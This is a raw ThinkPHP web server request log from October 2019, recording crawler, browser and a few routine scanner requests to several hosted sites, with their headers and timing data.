[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T11:30:23+08:00] 159.203.193.47 GET 123.57.56.8/manager/html
[运行时间：0.269913s] [吞吐率：3.70req/s] [内存消耗：1,971.45kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-13T11:56:53+08:00] 93.115.227.108 GET 123.57.56.8:80/
[运行时间：0.134068s] [吞吐率：7.46req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T12:44:18+08:00] 116.11.101.52 POST 123.57.56.8/app/api.php
[运行时间：0.049547s] [吞吐率：20.18req/s] [内存消耗：1,970.93kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-13T14:02:09+08:00] 123.125.71.115 GET aizhuanbao.cn/
[运行时间：0.358345s] [吞吐率：2.79req/s] [内存消耗：2,211.63kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
  'if-none-match' => '"W/"5d68d3e1-247""',
  'accept-language' => 'zh-cn,zh-tw',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'connection' => 'close',
  'host' => 'aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T14:38:50+08:00] 61.157.96.16 GET www.maxthink.cn/
[运行时间：0.261276s] [吞吐率：3.83req/s] [内存消耗：2,210.50kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Python/3.6 aiohttp/3.6.0',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'host' => 'www.maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T14:38:53+08:00] 61.157.96.16 GET www.maxthink.cn/
[运行时间：0.039045s] [吞吐率：25.61req/s] [内存消耗：2,212.54kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
  'upgrade-insecure-requests' => '1',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'connection' => 'keep-alive',
  'host' => 'www.maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T15:59:45+08:00] 47.101.61.193 GET aizhuanbao.cn/
[运行时间：0.059697s] [吞吐率：16.75req/s] [内存消耗：2,210.72kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'aizhuanbao.cn',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T16:19:37+08:00] 173.252.127.32 GET aizhuanbao.cn/?fbclid=IwAR0XBgTFyfT8fj8Q4an1us5iEClfQYN9igo1k-0QiwoJtz-DaFtHL8cudkQ
[运行时间：0.065431s] [吞吐率：15.28req/s] [内存消耗：2,213.24kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'aizhuanbao.cn',
  'accept-language' => 'en-US,en;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  'fbclid' => 'IwAR0XBgTFyfT8fj8Q4an1us5iEClfQYN9igo1k-0QiwoJtz-DaFtHL8cudkQ',
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T16:39:58+08:00] 112.224.67.190 POST 123.57.56.8/app/api.php
[运行时间：0.040902s] [吞吐率：24.45req/s] [内存消耗：1,970.93kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-13T16:41:39+08:00] 183.129.160.229 GET 123.57.56.8:80/
[运行时间：0.032167s] [吞吐率：31.09req/s] [内存消耗：2,210.79kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => '123.57.56.8:80',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T17:10:03+08:00] 149.140.92.141 GET 123.57.56.8:80/
[运行时间：0.034203s] [吞吐率：29.24req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T17:48:33+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
[运行时间：0.060893s] [吞吐率：16.42req/s] [内存消耗：1,971.41kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-13T18:15:31+08:00] 106.120.173.82 GET www.aizhuanbao.cn/
[运行时间：0.039525s] [吞吐率：25.30req/s] [内存消耗：2,211.13kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',
  'accept-encoding' => 'gzip,deflate',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'host' => 'www.aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T19:50:23+08:00] 220.181.108.146 GET aizhuanbao.cn/
[运行时间：0.322403s] [吞吐率：3.10req/s] [内存消耗：2,211.63kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
  'if-none-match' => '"W/"5d68d3e1-247""',
  'accept-language' => 'zh-cn,zh-tw',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'connection' => 'close',
  'host' => 'aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T21:08:31+08:00] 168.196.172.216 GET 123.57.56.8:80/
[运行时间：0.146287s] [吞吐率：6.84req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T21:10:18+08:00] 116.252.2.98 GET www.maxthink.cn/
[运行时间：0.035047s] [吞吐率：28.53req/s] [内存消耗：2,210.74kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'deflate, gzip',
  'accept' => '*/*',
  'host' => 'www.maxthink.cn',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T21:58:46+08:00] 45.33.10.162 GET 123.57.56.8/
[运行时间：0.030558s] [吞吐率：32.72req/s] [内存消耗：2,211.03kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => '123.57.56.8',
  'accept-encoding' => 'identity',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT; FreeBSD; Debian; Android) Gecko/20170101 Firefox Chrome Safaria',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T22:15:44+08:00] 128.14.133.58 GET 123.57.56.8/
[运行时间：0.031935s] [吞吐率：31.31req/s] [内存消耗：2,210.91kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
  'host' => '123.57.56.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T23:07:04+08:00] 123.125.71.70 GET aizhuanbao.cn/
[运行时间：0.380784s] [吞吐率：2.63req/s] [内存消耗：2,211.63kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
  'if-none-match' => '"W/"5d68d3e1-247""',
  'accept-language' => 'zh-cn,zh-tw',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'connection' => 'close',
  'host' => 'aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T23:08:04+08:00] 123.125.71.84 GET aizhuanbao.cn/
[运行时间：0.033025s] [吞吐率：30.28req/s] [内存消耗：2,211.63kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
  'if-none-match' => '"W/"5d68d3e1-247""',
  'accept-language' => 'zh-cn,zh-tw',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'connection' => 'close',
  'host' => 'aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T23:11:25+08:00] 54.36.148.41 GET www.aizhuanbao.cn/
[运行时间：0.033308s] [吞吐率：30.02req/s] [内存消耗：2,210.73kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'deflate, gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)',
  'host' => 'www.aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
